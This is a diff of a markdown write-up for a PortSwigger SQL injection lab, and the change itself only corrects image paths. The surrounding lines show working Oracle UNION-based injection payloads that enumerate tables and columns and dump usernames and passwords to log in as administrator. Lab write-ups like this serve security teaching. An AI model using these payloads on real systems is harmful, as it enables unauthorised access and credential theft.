@@ -18,19 +18,19 @@ To solve the lab, log in as the `administrator` user.
 
 **Home page:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205070955.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205070955.png)
 
 **In the previous labs, we found an SQL injection vulnerability in the product category filter:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205071046.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071046.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205071100.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071100.png)
 
 And we can confirm that **this table has 2 columns.**
 
 **However, when we use the `UNION` clause, it outputs an `500 Internal Server Error` HTTP status:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205071326.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071326.png)
 
 In the [7th lab](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-7/README.md), we found that **Oracle database must have `FROM` clause in `SELECT` statement.**
 
@@ -39,14 +39,14 @@ In the [7th lab](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger
 ' UNION SELECT NULL,NULL FROM dual-- -
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205071426.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071426.png)
 
 **Next, we need to find which column accepts string data type:**
 ```sql
 ' UNION SELECT 'string1','string2' FROM dual-- -
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205071514.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071514.png)
 
 Both columns are accepting string data type.
 
@@ -58,7 +58,7 @@ Both columns are accepting string data type.
 ' UNION SELECT NULL,table_name FROM all_tables WHERE table_name LIKE '%user%'-- -
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205071908.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205071908.png)
 
 The table `USERS_GCZDLS` looks sussy, let's list all columns from that table.
 
@@ -68,7 +68,7 @@ The table `USERS_GCZDLS` looks sussy, let's list all columns from that table.
 ' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_GCZDLS'-- -
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205072106.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205072106.png)
 
 Table `USERS_GCZDLS` columns: `PASSWORD_BGCXGZ`, `USERNAME_SVWHIB`
 
@@ -80,7 +80,7 @@ Then, we can extract all the data from that table.
 ' UNION SELECT NULL,USERNAME_SVWHIB||':'||PASSWORD_BGCXGZ FROM USERS_GCZDLS-- -
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205072242.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205072242.png)
 
 Found `administrator` password!
 
@@ -89,9 +89,9 @@ Found `administrator` password!
 
 **Let's login as `administrator`:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205072332.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205072332.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/images/Pasted%20image%2020221205072343.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-10/images/Pasted%20image%2020221205072343.png)
 
 We're user `administrator`!!
 
